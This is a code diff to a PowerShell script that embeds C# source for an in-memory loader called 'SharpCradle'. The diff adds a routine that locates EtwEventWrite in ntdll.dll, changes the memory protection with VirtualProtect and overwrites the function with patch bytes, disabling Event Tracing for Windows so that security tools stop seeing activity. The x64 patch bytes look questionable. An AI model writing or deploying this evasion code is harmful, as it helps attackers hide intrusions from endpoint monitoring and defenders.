@@ -21,21 +21,66 @@ Param
         $argument3
 )
 
+
 $cradle = @"
 using System;
 using System.IO;
 using System.Linq;
 using System.Net;
 using System.Reflection;
+using System.Runtime.InteropServices;
 
 
 namespace SharpCradle
 {
+    public class Win32
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    }
+
     public class Program
     {
+        public static void EtwPatch(byte[] patch)
+        {
+            try
+            {
+                uint oldProtect;
+
+                var ntdll = Win32.LoadLibrary("ntdll.dll");
+                var etwEventSend =   Win32.GetProcAddress(ntdll, "EtwEventWrite");
+
+                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
+                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
+            }
+            catch
+            {
+                Console.WriteLine("Error unhooking ETW");
+            }
+        }
         public static void Main(params string[] args)
         {
-            
+            Console.WriteLine("Doing ETW unhook.");
+            if (IntPtr.Size == 8)
+            {
+                Console.WriteLine("x64 patch.");
+                EtwPatch(new byte[] {0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 });
+            }
+            else
+            {
+                Console.WriteLine("x86 patch.");
+                EtwPatch(new byte[] { 0xc2, 0x14, 0x00 });
+            }
+            Console.WriteLine("ETW Unhook done!");
+
+            Console.ReadLine();
+     
           try
           {
           
